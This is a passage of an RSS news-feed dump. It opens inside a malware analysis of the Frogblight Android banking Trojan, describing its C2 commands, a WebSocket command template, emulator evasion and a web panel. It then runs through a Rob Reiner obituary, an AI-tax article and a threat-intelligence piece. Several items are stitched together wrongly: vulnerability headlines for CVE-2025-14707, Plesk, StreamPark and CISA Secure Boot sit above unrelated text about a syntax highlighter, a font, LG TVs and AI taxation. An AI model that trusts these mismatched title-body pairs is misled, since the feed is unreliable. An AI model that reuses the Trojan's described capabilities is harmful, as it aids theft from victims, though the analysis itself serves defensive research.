●       EDIT_CONTACT: edit a contact on the user devicedevice_id: unique Android device IDdevice_id: unique Android device ID
call_logs: call log dataSend notifications log to the C2. Not fully implemented in this sample, and as of the time of writing this report, we hadn’t seen any samples with a full-fledged implementation of this API methodaction: same as the API method name
notifications: notification log dataAlso, the threat actor had implemented a custom input method for recording keystrokes to a file using the com.puzzlesnap.quickgame.CustomKeyboardService service.Another Frogblight sample we observed trying to avoid emulators and using geofencing techniques is 115fbdc312edd4696d6330a62c181f35. In this sample, Frogblight checks the environment (for example, device model) and shuts down if it detects an emulator or if the device is located in the United States.Part of the code responsible for avoiding Frogblight running in an undesirable environmentLater on, the threat actor decided to start using a web socket instead of the REST API. Let’s see an example of this in one of the recent samples (08a3b1fb2d1abbdbdd60feb8411a12c7). This sample is disguised as an app for receiving social support via an official government webpage. The feature set of this sample is very similar to the previous ones, with several new capabilities added. Commands are transmitted over a web socket using the JSON format. A command template is shown below:{
    "id": <command ID>,
    "command_type": <command name>
    "command_data": <command data>
}
It is also worth noting that some commands in this version share the same meaning but have different structures, and the functionality of certain commands has not been fully implemented yet. This indicates that Frogblight was under active development at the time of our research, and since no its activity was noticed after September, it is possible that the malware is being finalized to a fully operational state before continuing to infect users’ devices. A full list of commands with their parameters and description is shown below:Send a registration message to the C2Send various information, such as call logs, to the C2; start pinging the C2 and requesting commandsLog info about an invalid login key to the Android log systemSend an arbitrary SMS messagerecipient: message destination
message: message textSend an arbitrary SMS message to multiple recipientsrecipients: message destinations

download_path: downloading pathSend a registration message to the C2, including info about specific permissionsSend information about the current device state, such as battery level, screen state, and so onLog info about connection errors to the Android log systemSend a registration message to the C2Stop pinging the C2 and requesting commands from itAuthentication via WebSocket takes place using a special key.The part of the code responsible for the WebSocket authentication logicAt the IP address to which the WebSocket connection was made, the Frogblight web panel was accessible, which accepted the authentication key mentioned above. Since only samples using the same key as the webpanel login are controllable through it, we suggest that Frogblight might be distributed under the MaaS model.The interface of the sign-in screen for the Frogblight web panelJudging by the menu options, the threat actor can sort victims’ devices by certain parameters, such as the presence of banking apps on the device, and send bulk SMS messages and perform other mass actions.Since some versions of Frogblight opened the Turkish government webpage to collect user-entered data on Turkish banks’ websites, we assume with high confidence that it is aimed mainly at users from Turkey. Also, based on our telemetry, the majority of users attacked by Frogblight are located in that country.Even though it is not possible to provide an attribution to any known threat actor based on the information available, during our analysis of the Frogblight Android malware and the search for online mentions of the names it uses, we discovered a GitHub profile containing repos with Frogblight, which had also created repos with Coper malware, distributed under the MaaS model. It is possible that this profile belongs to the attackers distributing Coper who have also started distributing Frogblight.GitHub repositories containing Frogblight and Coper malwareAlso, since the comments in the Frogblight code are written in Turkish, we believe that its developers speak this language.The new Android malware we dubbed “Frogblight” appeared recently and targets mainly users from Turkey. This is an advanced banking Trojan aimed at stealing money. It has already infected real users’ devices, and it doesn’t stop there, adding more and more new features in the new versions that appear. It can be made more dangerous by the fact that it may be used by attackers who already have experience distributing malware. We will continue to monitor its development.]]></content:encoded></item><item><title>CVE-2025-14707 - Shiguangwu sgwbox N3 DOCKER Feature http_eshell_server command injection</title><link>https://cvefeed.io/vuln/detail/CVE-2025-14707</link><author></author><category>vulns</category><pubDate>Mon, 15 Dec 2025 06:15:43 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-14707

                            Nothing to configure—it just works. Arborium is built in
                                and automatically highlights all code blocks.
                             languages included, each behind a
                        feature flag. Enable only what you need, or use
                         for everything.
                    
                        Each feature flag comment includes the grammar's license, so you always know
                        what you're shipping.
                    
                        The highlighter supports themes for both  and
                         output.
                    
                        Custom themes can be defined programmatically using RGB colors and style
                        attributes (bold, italic, underline, strikethrough).
                    
                        Every grammar is compiled to WASM with aggressive size optimizations. Here's the complete build pipeline:
                    We compile with nightly Rust using  to rebuild the standard library with our optimization flags:Generate JavaScript bindings with  for ES module output.Final size optimization pass with Binaryen's optimizer:
                        Despite all these optimizations, WASM bundles are still large because each one embeds the full tree-sitter runtime.
                        We're exploring ways to share the runtime across grammars, but that's the architecture trade-off for now.
                    Why not
                            highlight.js or Shiki?
                        
                                Those use regex-based tokenization (TextMate grammars). Regexes
                                can't count brackets, track scope, or understand structure—they just
                                pattern-match.
                            
                                Tree-sitter actually  your code into a syntax tree,
                                so it knows that  is a keyword only in the right
                                context, handles deeply nested structures correctly, and recovers
                                gracefully from syntax errors.
                            
                                IDEs with LSP support (like rust-analyzer) can do even better with
                                 highlighting—they understand types and
                                dependencies across files—but tree-sitter gets you 90% of the way
                                there without needing a full language server.
                            Why the name
                            "arborium"?
                         is Latin for tree (as in tree-sitter), and
                                 denotes a place or collection (like aquarium,
                                arboretum).
                            It's a place where tree-sitter grammars live.I
                            have a grammar that's not included. Can you add it?
                        
                                We'll review it and add it if the grammar and highlight queries are
                                in good shape.
                            Why not use the WASM builds from tree-sitter CLI?
                        
                                When doing full-stack Rust, it's nice to have  the
                                same code on the frontend and the backend.
                            
                                Rust crates compile to both native and WASM, so you get one
                                dependency that works everywhere.
                            Why are
                            tree-sitter parsers so large?
                        
                                Tree-sitter uses table-driven LR parsing. The grammar compiles down
                                to massive state transition tables—every possible parser state and
                                every possible token gets an entry.
                            
                                These tables are optimized for O(1) lookup speed, not size. A
                                complex grammar like TypeScript can have tens of thousands of
                                states.
                            
                                The tradeoff is worth it: you get real parsing (not regex hacks)
                                that handles edge cases correctly and recovers gracefully from
                                syntax errors.

Unscii attempts to support character cell art well while also being suitable
for terminal and programming use.The two main variants are unscii-8 (8×8 pixels per glyph) and unscii-16
(8×16). There are also several alternative styles for unscii-8, as well as
an 8x16 "full" variant that incorporates missing Unicode glyphs from
Fixedsys Excelsior and GNU Unifont. "unscii-16-full" falls under GPL because
of how Unifont is licensed; the other variants are in the Public Domain.Unscii was created by Viznut.In 2020-03-10, the new Unicode version
13.0 added 214 graphics characters for "legacy computing" (including,
among all, the missing PETSCII characters, and a majority of missing
Teletext/Videotex characters). Most of these were already included in Unscii
1.x, but now I have been able to give them proper Unicode mappings as well.
This is the main reason for the Unscii 2.0 release.Additionally, Unscii 2.0 fixes errors in some characters, legibility in
some others and adds a bunch of new ones.A test picture representing what is currently available in Unicode (feel
free to copy-paste it to your editor to see what it looks like in other

Here are some conversions of legacy character set art into Unscii.Amiga ansi: Divine Stylers by Hellbeard, as rendered with unscii-16.
SourcePC ansi: Ansi Love by Rad Man, as rendered with unscii-16.
SourceCommodore 64 petscii pictures as rendered with unscii-8, using the
256-color xterm palette: I Has Floppy by Redcrab; The First Ball by
Dr.TerrorZ; Gary by Mermaid.The source code package includes a generic bitmap-to-unscii converter. Here's an 
example of a conversion to unscii-8 using the 256-color xterm
palette, without dithering:HEX and PCF are the only actual bitmapped formats here. HEX is the same
simple hexdump format as used by the Unifont project. TTF, OTF and WOFF
are vectorized.NOTE: Due to format limitations, the PCF versions lack all the characters
above U+FFFF! However, all the new graphics characters are provided in the
good old PUA range as well. A mapping is in the file uns2uni.tr.Years ago, I noticed that Unicode had a bunch of pseudographic characters
that could be used to enrichen Ansi art. However, no one seemed to use them.
Even MUDs that used the 256-color Xterm palette and had no issues with
Unicode still preferred to stick to the blocks available in the MS-DOS
codepage 437.After looking into existing Unicode fonts, the reason became obvious: the
implementation of non-CP437 graphics characters was shaky at best. Unicode
Consortium doesn't even care how pseudographics are implemented. It was a
kind of chicken-and-egg problem: No commonly accepted Unicode graphics font,
no Unicode art scene; no art scene, no font support. The idea of an
art-compatible Unicode font was born.For Unscii, I studied a bunch of classic system fonts and how their
characters had been used in Ascii and "extended-Ascii" art.8×8 system fonts can be divided in two major categories according to
their line thickness: 1-pixel and 2-pixel. 2-pixel-wide lines are used in
more prominent classic systems, so I chose it. Also, 2-pixel 8×8 system
fonts are surprisingly similar to one another which made it easier to choose
neutral shapes.The basic look of the 8×8 variant of Unscii is based on the following
systems:Atari 8-bit (as in 800, XL etc.)Atari Arcade (the iconic ROM font)Atari 32-bit (as in ST etc.)BBC Micro (graphics mode font)IBM PC (the 8×8 ROM font as in CGA, or VGA 80×50)The 8×16 variant of Unscii has been mostly derived from the 8×8 variant
by using a set of transformation principles. When in doubt, the following
fonts have been looked at for additional reference:Windows Fixedsys 8×15 (and its modern successor Fixedsys Excelsior)IBM PC VGA ROM font(s) (and their modern successor U_VGA)X Window System fonts 8x13(B) and 9x15(B)Classic Macintosh 12-point MonacoDigital VT420 10×16 font (used in the 80×24 mode)Modern monospaced vector fonts: DejaVu Sans Mono, Lucida Console,
InconsolataIn general, neutral shapes are preferred, unless art, legibility or
readability require otherwise: The characters /\XY are connective because of
their connetive use in ascii art, and the serifs in iIl are longer than in
most classic systems.Whenever a 8×16 shape has not been defined, Unscii falls back to
height-doubled 8×8.I also studied game fonts and thin-line system fonts. This resulted in
the variants unscii-8-thin, unscii-8-mcr and unscii-8-fantasy.When studying legacy character sets, I found literally hundreds of
characters without proper Unicode codepoints. These are mapped in the PUA
range as follows:U+E080..E0FF: Teletext/Videotex block mosaics.U+E100..: The most prominent and useful non-Unicode pseudographics:
everything found in PETSCII, Videotex smooth mosaics, extra shades,
round corners, X/Y doublers.U+E800..: Somewhat stranger but still potentially useful: junctions with
border-aligned lines, diagonal line junctions, non-straight lines, weirder
fill patterns, etc.U+EC00..: Total oddities. Mostly game-oriented bitmaps and other
depictive characters from Sharp MZ, Aquarius, etc.Since Unicode 13.0, many of these are also available in Unicode, but
the PUA mappings are retained for compatibility.]]></content:encoded></item><item><title>Rob Reiner has died</title><link>https://www.hollywoodreporter.com/movies/movie-news/rob-reiner-dead-harry-met-sally-princess-bride-all-in-family-1236450387/</link><author>RickJWagner</author><category>dev</category><pubDate>Mon, 15 Dec 2025 03:54:03 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Rob Reiner, who directed such beloved Hollywood classics as ,  and  after starring in the trailblazing sitcom , died Sunday along with his wife, Michele, in their Brentwood home. He was 78.
	Reiner and his wife, 70, were found dead in their home on Chadbourne Avenue, with the couple “suffering lacerations consistent with a knife,” law enforcement sources told. There reportedly was no sign of forced entry.


	Said a spokesperson for the family: “It is with profound sorrow that we announce the tragic passing of Michele and Rob Reiner. We are heartbroken by this sudden loss, and we ask for privacy during this unbelievably difficult time.”

	
	The Reiners’ son Nick, 32, has been arrested and booked on suspicion of murder and is being held without bail as the Los Angeles Police Department declares he is “responsible” for the homicide death of his parents. He battled drug addiction and homelessness, had more than a dozen stints in rehab and co-wrote a film loosely based on his life,  (2015), that was directed by his father.
	The Los Angeles Fire Department had been called to the Reiners’ home at about 3:40 p.m. by an unidentified person, and LAPD Robbery Homicide Division detectives were investigating. (1987),  (1990), the Oscar best picture nominee (1992)(1995) and  (2007) also were among Rob Reiner’s 20-plus directing credits.
	Reiner was also a co-founder of Castle Rock Entertainment, the production company behind such films as (1991),(1994),(1996), (2000), (2000),(2007) and , one of the most lucrative television properties of all time.

	
	From the outset of his feature directorial career with  (1984), Reiner seemed to reimagine Hollywood standards, creating and starring in the first mainstream mockumentary — a rock ’n’ roll satire so dead-on, film critic Roger Ebert called it “one of the funniest movies ever made.” From there, he would move seamlessly from comedy to drama, from fantasy to horror, as few directors ever have.
	Reiner would establish yet another benchmark — this time for romantic comedies — with  (1989), screenwriter Nora Ephron’s ode to true love (based loosely on her and Reiner’s lives) that starred Billy Crystal and Meg Ryan.
	His biggest box office hit, the gripping courtroom drama , based on Aaron Sorkin’s 1989 play and starring Tom Cruise and Jack Nicholson, could not have been more different.
	Some of Reiner’s movies took a while to capture the world’s attention. , his timeless fairy tale adventure that was based on the William Goldman novel and starred Robin Wright, Mandy Patinkin and Peter Falk, was one of several films that grew in popularity over decades on the way to cult status.
	On television, Reiner played to some of the biggest audiences in history, first in the role of Michael “Meathead” Stivic, the liberal antagonist of Carroll O’Connor’s Archie Bunker, on CBS’ , and then as a ground-floor executive on NBC’s which he fought to keep on the air. 

	
	“We knew we had a great show,” Reiner told Howard Stern in 2016. 
	But after a rocky launch in the summer of 1989, the network was concerned that  — famously a show “about nothing” — was a misfire. After four episodes, it was on the brink of cancellation.
	“I went in there and had a screaming crazy thing with [NBC president] Brandon Tartikoff,” Reiner said. “And I promised him — there  be !”
	In 1993, Reiner and Castle Rock partners Andrew Scheinman, Alan Horn, Glenn Padnick and Martin Shafer sold their company to broadcast mogul Ted Turner for about $160 million. (It became part of Time Warner when it acquired Turner Broadcasting in 1996.) 
	The principals stayed on, holding to their original ideal: to make independent movies outside the traditional studio system. But after a run of poorly performing films starting in the late ’90s, Castle Rock initiated layoffs and eventually was absorbed into Warner Bros.
	In 2020, Reiner relaunched the company and revived its film division a year later, with Spinal Tap II: The End Continues (2025) among its offerings. 
	“There’s not one film that I’ve ever made that could get made today by a studio, not one — even ,” Reiner said. “Every movie that I make, have made and will make is always going to be independently financed.”
	Throughout his behind-the-camera career, Reiner continued as a working actor. He played the well-intentioned plastic surgeon Dr. Morris Packman, who affectionately spars with Goldie Hawn, in  (1996); Tom Hanks’ pal in Ephron’s  (1993); the father of Zooey Deschanel on the 2011-18 Fox sitcom ; and restaurant consultant Albert Schnurr on Hulu’s  this year.

	
	He was particularly memorable in Martin Scorsese’s  (2013) as stockbroker Max Belfort in scenes with Leonardo DiCaprio and Jonah Hill that were largely improvised.
	Reiner’s sense of what worked onscreen was honed early on — first at home as the oldest child of comedy icon Carl Reiner and later around his dad’s close friends, among them Sid Caesar, Neil Simon, Mel Brooks and the most influential of all, Norman Lear, the TV auteur whose 1970s activist comedies All in the Family, The Jeffersons, Good Times and sparked seismic shifts in popular culture. 
	“Norman was the first guy who recognized that I had any talent,” Reiner wrote forin the wake of Lear’s 2023 death, noting that he viewed him as “a second father.”
	“It wasn’t just that he hired me for ,” Reiner told  in 2005. “It was that I saw, in how he conducted his life, that there was room to be an activist as well. That you could use your celebrity, your good fortune, to help make some change.”
	As the Hollywood scion forged his directing career, it was Lear who put up the money for  (1986) and Reiner’s other early films, including the John Cusack-Nicollette Sheridan romp  (1985), lauded for elevating the teen comedy genre. 

	 — regarded as among the finest of coming-of-age movies — marked Reiner’s ascent into Hollywood’s highest ranks, no longer just a sitcom actor or the genial ex-husband of a fellow TV comic, Penny Marshall, star of . (Marshall too would go on to become a top Hollywood director.)
	Famed author-screenwriter Goldman, who penned the  screenplay, said Reiner became a success because his work is “funny, but not simpy.”
	“His films have a certain comedy style … a sweetness and toughness,” Goldman told in 1987. “is not just about four kids coming of age before junior high school — they’re going to see a corpse. If John Hughes had made  — and I’m not knocking Hughes — they would have been searching for a convertible.”
	Stephen King, author of the 1982 novella  (on which  was based) and the 1987 novel , became one of Reiner’s most-steadfast collaborators. 
	Among other King books turned into movies by Castle Rock — Reiner named the company for the fictional setting in many of the author’s novels — were Shawshank, The Green Mile (1999)and(1995).
	After several false starts, King finally agreed to develop  for the screen, but only if Reiner put “his name on it” as producer or director.
	“It was a very personal book to him,” Reiner told TCM in 2021. “It was all about himself as a writer and feeling trapped … And so he let us option the book for $1. In fact, I think we made seven Stephen King films, and each one of them we got an option for $1.” 

	
	The 1990 Kathy Bates-James Caan starrer remains one of Hollywood’s finest horror pieces, with Bates winning an Oscar for her role as the obsessive fan Annie Wilkes, who tortures author Paul Sheldon (Caan) while holding him hostage in her remote cabin.
	“Rob had a fantastic crew of people — people he had worked with for years, just the creme de la creme,” Bates said of the  shoot in a 2020 interview with . “I learned so much just hanging out [on set] and watching.”
	Bates, 42 years old at the time, had predominantly been a stage actress. At the Academy Awards, where she bested Meryl Streep, Joanne Woodward, Anjelica Huston and Julia Roberts, she thanked Reiner “for taking a chance on me.”
	Often the most memorable scenes in Reiner’s filmography came from his comedies — notably Ryan’s climactic moment in  in which she feigns an orgasm over lunch with Crystal’s character at Katz’s Deli.
	Yet it was Reiner’s mother, Estelle Reiner, who landed the film’s renowned punchline: “I’ll have what she’s having.”
	“I said to her, mom, the line you have is the last line in the scene, and if it doesn’t pop and top everything that’s come before it, I won’t use it,” Reiner told the AFI in a joint interview with Ephron in 2009. “We’ll shoot it but be prepared, it might have to be cut.
	“And she said, ‘I don’t care, I just wanna spend the day with you and be with you on the set. I don’t care if it’s in the movie or not.’” 

	
	Robert Reiner was born in the Bronx on March 6, 1947, one of three children of the former Estelle Lebost, an artist and set designer, and Carl Reiner, the comic and writer who got his start as an entertainer in the U.S. Army and then in Broadway musicals.
	The family lived just off Grand Concourse, across the street from Marshall and her brother, future writer-producer-director Garry Marshall. But it would be decades before Rob and Penny actually met — at the 1970 audition in Los Angeles for the roles of Mike and Gloria Stivik on . (The role of Gloria, of course, would go to Sally Struthers.)
	As Carl’s career gained steam (he would win 11 Emmys), the family moved to Bonnie Meadow Road in the bucolic New York suburb of New Rochelle. It was the very street where Reiner would set his landmark 1960s CBS sitcom , about a rising comedy writer, Rob Petrie, and his beautiful wife, Laura.
	“Basically he wrote his own life in ,” Rob Reiner said of his father. “And my mother was Mary Tyler Moore.”
	Rob got his start as an apprentice at the Bucks County Playhouse in Pennsylvania and with small guest roles on such shows as and 
	After UCLA Film School in 1967, he was paired with another young comic, Steve Martin, as a writing team on CBS’ The Smothers Brothers Comedy Hour. The two were barely out of their teens. 

	
	The  role, for which Reiner would win two Emmys, followed in 1971. Convinced the show’s incendiary subject matter would be rejected by viewers, he initially viewed the gig as a stopgap to tide him over between writing gigs.
	When the sitcom became a hit (Reiner stayed for eight of its nine seasons), he continued writing anyway, penning four episodes of the show and co-writing (with Garry Marshall and Phil Mishkin) the first episode of ABC’s  in 1974.
	As a filmmaker notably surrounding himself with many of the industry’s top writers — Goldman, King, Sorkin, Ephron, Crystal — Reiner showcased their dialogue to everlasting effect.“Hello, my name is Inigo Montoya. You killed my father. Prepare to die”;  “I’m your No. 1 fan”;  “You can’t handle the truth”; and  “I’ll have what she’s having” (Crystal actually came up with that line) reigned in pop culture for decades.
	But as Penny Marshall would humorously point out, no matter how substantive their accomplishments, “For me, all they say is ‘Laverne,’ and for Rob … it’s ‘Meathead,’” she told the  in 2012. “We’re stuck with it.”
	The couple performed together infrequently but did co-star in the well-received 1978 romantic comedy  The ABC telefilm, written by Reiner and Mishkin and directed by James Burrows, was something of a precursor to , about childhood pals unsure if they should pursue love as adults.

	
	Reiner also made an appearance as “Sheldn” (no “o”), the fiancé of Penny’s Myrna Turner, on Garry Marshall’s ABC series 
	Their 10-year marriage came to an end in 1981 — amid tension as  shot Marshall to superstardom while Reiner was quietly forging his post-sitcom film career.
	Upon Marshall’s death in 2018, Reiner professed his admiration for her, tweeting “so sad about Penny.” He added, “I loved Penny. I grew up with her. She was born with a great gift. She was born with a funny bone and the instinct of how to use it. I was very lucky to have lived with her and her funny bone. I will miss her.”
	The couple were the parents of actress Tracy Reiner, born in 1964 to Marshall during a brief first marriage and adopted by Reiner soon after their 1971 wedding. 
	In 1989, Reiner married Michele Singer, a photographer whom he met on the set of . He said she was the inspiration for the film’s happily-ever-after script change. In 2020, she joined Reiner in running Castle Rock and produced films. 
	In addition to Nick, the couple had two other children, son Jake and daughter Romy.
	A lifelong political activist who with King was among the public figures to urge President Joe Biden to hand the 2024 re-election reins to Kamala Harris, Reiner rarely missed a week on social media, penning calls to action on a range of social justice issues for his millions of followers. 

	
	He was among Hollywood’s most vigorous and constant voices opposing Donald Trump.
	Among his other causes, Reiner was the co-founder of the American Foundation for Equal Rights, which fought to overturn California’s ban on same-sex marriage. In the late-’90s, he and his father were activists for higher taxes on cigarettes — money that was earmarked for prenatal care.
	His advocacy was often part of his writing and filmmaking, from his earliest days with the Smothers brothers to  (2016) and  (2017), about journalists investigating the Bush administration’s 2003 invasion of Iraq.
	Reiner was often a Hollywood peacemaker, well known for putting actors and crew at ease. When Bates and Caan clashed early in the production of  (she liked rehearsing; he preferred winging it), Reiner brokered a wary peace while using the tension to elicit superb performances. 
	“I want everyone around me to feel comfortable and happy,” he told in 2018. “People only act up out of insecurity, and when they make it difficult, I just say, ‘We’re playing make-believe here — enjoy yourself!’”Mike Barnes, Kimberly Nordyke and Scott Feinberg contributed to this report.]]></content:encoded></item><item><title>CISA Releases Guidance for Managing UEFI Secure Boot on Enterprise Devices</title><link>https://cybersecuritynews.com/cisa-guidance-uefi-secure-boot/</link><author></author><category>security</category><pubDate>Mon, 15 Dec 2025 03:16:25 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

However, the controversy doesn't stop at PC operating systems. It seems to extend to TVs as well. According to Reddit user u/defjam16, his LG TV webOS received an update that installed Microsoft's Copilot AI app, with no option to remove it. Although users can choose to ignore it, the push for increased AI integration in everyday products is becoming unavoidable, even on TVs. What exactly can a Copilot AI app do in your TV? We don't know either.
Microsoft is likely promoting its Copilot on TVs to capture more of the AI app market, aiming to become the go-to platform for AI inquiries. Since webOS is a Linux-based TV operating system LG uses, it is also possible that Microsoft is preparing the Copilot AI app for a wider rollout to Linux users, who are now officially commanding a 3% market share among PCs. Other TV operating system platforms are also at "risk" of getting a dedicated Microsoft Copilot AI app, which is especially bad for people not wanting their TV to do any AI processing.Additionally, LG has a setting called "Live Plus" that Reddit users highlighted. When it's turned on, the TV can recognize what's displayed on screen and use that viewing information for personalized recommendations and ads. LG describes it as an "enhanced viewing experience," but you can disable it in the menu under Settings > All Settings > General > Additional Settings (though exact wording varies by model). This likely uses another AI model to help sort the user data and make recommendations.]]></content:encoded></item><item><title>Critical Plesk Flaw (CVE-2025-66430) Risks Full Server Takeover via LPE and Apache Config Injection</title><link>https://securityonline.info/critical-plesk-flaw-cve-2025-66430-risks-full-server-takeover-via-lpe-and-apache-config-injection/</link><author></author><category>security</category><pubDate>Mon, 15 Dec 2025 00:32:15 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Artificial intelligence (AI) has become the object of desire for Big Tech, which is pouring astronomical sums into its development, fueled by record profits. The other side of this frenzy is workforce reductions, with automation as the backdrop, announced by multinationals like Amazon, Meta, and UPS, which, incidentally, threaten to extend the impact of new technologies to another area: public coffers. Fewer people working means fewer taxpayers, so the question naturally arises: if machines and algorithms replace humans in their jobs, should they also have to cover the taxes that humans stop paying?Labor, through income tax and social security contributions, is one of the pillars of the tax systems of almost all countries, and the impact of automation on the tax base — or, in other words, the potential decrease in revenue — is not a new concern. In 2019, Nobel laureate Edmund Phelps proposed a tax on robots to help maintain social benefits. Shortly before, Bill Gates, founder of one of the world’s largest technology companies, Microsoft, which has its own artificial intelligence (Copilot), had suggested applying the same tax burden to robots as would be borne by the workers they replace.“The trend toward automation and AI could lead to a decrease in tax revenues. In the United States, for example, about 85% of federal tax revenue comes from labor income,” says Sanjay Patnaik, director of the Center for Regulation and Markets at the Brookings Institution. He suggests that governments address “the risks posed by AI” by increasing capital gains taxation rather than creating a specific tax on it, due to the difficulties in designing such a tax and the distortions it could generate. The repeated use of the conditional tense is because the impact of generative AI, the kind capable of creating content on demand, is still uncertain, both in positive terms — improved productivity and economic growth — and negative terms; job losses.Even so, forecasts are mixed. Goldman Sachs, for example, estimates that AI will boost global GDP by 7% over the next decade; the IMF predicts it will contribute up to eight-tenths of a percentage point annually to growth between now and 2030. On the other hand, the International Labour Organization estimates that one in four workers worldwide, concentrated in high-income countries, holds a job with some degree of exposure to AI, but at the same time predicts that most jobs will be transformed rather than disappear.“We know there will be an impact, but it’s difficult to quantify,” confirms Luz Rodríguez, a professor of labor law and a former Spanish Secretary of State for Employment. “The previous wave of automation affected employment in the middle of the production chain; generative AI is targeting higher up the ladder, more skilled jobs that require critical thinking,” she summarizes. “I’m not optimistic, but I am positive: there are jobs being created that wouldn’t exist without new technologies, such as content moderators on social media or Bitcoin miners.”Daniel Waldenström, a professor at the Stockholm Institute for Industrial Economics, rejects the idea of a specific tax on AI, arguing that there has been no significant increase in unemployment, even in the United States, the birthplace of these new technologies and a leader in their implementation. He also emphasizes the difficulty in defining it precisely: “What are automation, robots, or AI? A chip, a humanoid machine, an application, or a computer program? We will never be able to define it precisely. We should continue taxing what already exists: income from labor, consumption, and capital gains.”The International Monetary Fund (IMF) has also joined the debate. In a report published last summer, the organization’s economists reached a mixed conclusion: they did not recommend specifically taxing AI — as this could stifle productivity and distort the market — but urged governments to remain vigilant against potential disruptive scenarios. Their proposals included raising taxes on capital — which have been decreasing as the tax burden on labor has increased — creating a supplementary tax on “excessive” corporate profits, and reviewing tax incentives for innovation, patents, and other intangible assets that, while boosting productivity, can also displace human jobs.Carl Frey, associate professor of AI and Work at Oxford University and author of the book (Princeton University Press, 2025), holds a similar view: he does not support an AI tax, but acknowledges that the tax system has become unbalanced. “In many OECD economies, we have seen an increase in income taxes and a decrease in capital taxes,” he notes. This system incentivizes companies to invest more in automation than in job-creating technologies. “Addressing this imbalance is essential to supporting the job-creating technologies of the future.”The recent moves by major tech companies and the evolution of tax systems in recent years justify this concern. Amazon, for example, has announced a 38% increase in profits and multimillion-dollar investments in AI, while simultaneously reporting 14,000 job cuts worldwide. Meanwhile, corporate tax rates have plummeted in the last decade in OECD countries, from 33% in 2000 to the current 25%; the tax wedge for workers — income tax and social security contributions — has decreased by only 1.3 percentage points in the same period, from 36.2% to 34.9%.Susanne Bieller, secretary general of the International Federation of Robotics, argues that applying ad hoc taxes stems from “a problem that doesn’t exist,” since automation and robots “create new jobs by increasing productivity.” She warns that taxing production tools instead of business profits “would have a negative impact” on competitiveness and employment. “We need incentives for [European] companies to use technologies like robots and digitalization to remain competitive globally,” she concludes. “The world faces a labor shortage of approximately 40 million jobs per year [...] Robots cannot take over entire jobs, but they can handle certain tasks.”In addition to employment, the soaring spending of major tech companies on AI and the surge in their stock prices are causing concern, raising fears of a bubble. Analysts also warn that the energy consumption of these technologies is so high that their climate footprint could offset the promised growth benefits.In the best-case scenario, the new jobs created by AI could be “more productive, better paid, and more accessible,” offsetting job and tax losses, predicts Patnaik. However, the latent — and very likely — risk remains that the process will not be automatic. Job creation could be delayed, less-skilled professionals could struggle to adapt, and a gap could emerge between countries — and within them — and across productive sectors.MIT economists Daron Acemoğlu and Simon Johnson warned about this in 2023. “Over the past four decades, automation has increased productivity and multiplied corporate profits, but it has not led to shared prosperity in industrialized countries,” they cautioned in a document for the IMF. “Technology and artificial intelligence produce social impacts that are relevant to politics. We cannot allow technological determinism,” Rodríguez asserts. “The debate is necessary, and we will go wherever we want to go.”]]></content:encoded></item><item><title>Apache StreamPark Flaw Risks Data Decryption &amp; Token Forgery via Hard-Coded Key and AES ECB Mode</title><link>https://securityonline.info/apache-streampark-flaw-risks-data-decryption-token-forgery-via-hard-coded-key-and-aes-ecb-mode/</link><author></author><category>security</category><pubDate>Mon, 15 Dec 2025 00:16:58 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Apache StreamPark Flaw Risks Data Decryption & Token Forgery via Hard-Coded Key and AES ECB Mode

Enterprises face a rising tide of sophisticated threats that cannot be contained by traditional, reactive defenses alone. With AI and automation lowering the barrier to entry for attackers exploiting new avenues, there is more opportunity than ever for disruptive, high-volume attacks.The need for organizations to mature their threat intelligence capabilities is clear, but the road to get there isn’t always easy. Recorded Future’s 2025 State of Threat Intelligence Report found that only 49% of enterprises currently consider their threat intelligence maturity as advanced, yet 87% expect to make significant progress in the next two years.This gap between today’s capabilities and tomorrow’s ambitions reflects a familiar challenge: organizations have plenty of threat data, but struggle to connect, automate, and operationalize it effectively across teams and tools.Based on insights from the report, here is what enterprises can expect when it comes to threat intelligence in 2026.Key Trends Driving Threat Intelligence EvolutionThere are several key trends set to shape threat intelligence in the coming year, and organizations wanting to prioritize maturity should be on the lookout for partners that embrace and evolve with these currents in mind.Vendor Consolidation for Unified Intelligence: Enterprises are looking to reduce tool fragmentation by consolidating threat intelligence vendors and feeds into a single platform. A unified approach promises a “single source of truth,” making it easier to operationalize intelligence across the organization.Deeper Integration into Security Workflows: Organizations want threat intelligence deeply embedded in their existing security stack rather than as a siloed feed. In fact, 25% of enterprises plan to integrate threat intelligence with additional workflows (e.g. IAM, fraud, GRC) in the next two years to broaden their reach.Automation and AI Augmentation: To cope with accelerating threats and volumes of data, teams are embracing automation in threat intelligence. The future lies in machine-speed analysis that automatically correlates and enriches intelligence so analysts can focus on high-level judgment.Fusion of Internal and External Data: Over a third of organizations (36%) plan to combine external threat intelligence with data from their own environment to gain better insight into risk posture (and even benchmark against peers).Challenges Holding Team Backs TodayDespite this forward momentum, many enterprise teams still struggle with persistent challenges that hinder their threat intelligence efforts. Fragmented ecosystems remain a top concern. Nearly half of organizations (48%) cite poor integration with existing security tools among their biggest pain points.Credibility and Trust Issues: Data means little if analysts don’t trust the intelligence. Half of enterprises say verifying the credibility and accuracy of threat intelligence is a major challenge.Signal-to-Noise Overload: With huge volumes of alerts and feeds, 46% of enterprises struggle to filter relevant insight from noise. This information overload hampers visibility into real threats, drains team efficiency, and contributes to analyst burnout.Lack of Context for Action: Even when threat data is available, 46% of organizations lack the context needed to translate it into meaningful risk insights or actionable priorities.These barriers help explain why many programs plateau at an intermediate maturity. Teams may ingest more data sources over time, but still fall short on the automation, integration, and context needed for truly advanced, predictive intelligence.Envisioning Threat Intelligence in 2026: Proactive, Integrated, and Business-AlignedIn the near future, leading enterprises will treat threat intelligence not as a side task but as a strategic function integrated into business processes. This means embedding threat insights directly into risk assessments, vulnerability management, and even board-level decisions on security (notably, 58% of organizations already use threat intelligence to guide business risk assessment decisions today).Instead of simply reacting to incidents after they occur, advanced threat intelligence programs will analyze patterns and emerging trends to warn of potential attacks before they fully materialize. This doesn’t mean magically “knowing the future,” but sharpening awareness by connecting subtle signals across many sources and mapping them to one’s environment.Human analysts will still be central for this kind of work, though their capabilities will be augmented by AI such that detection and response happen at machine speed. 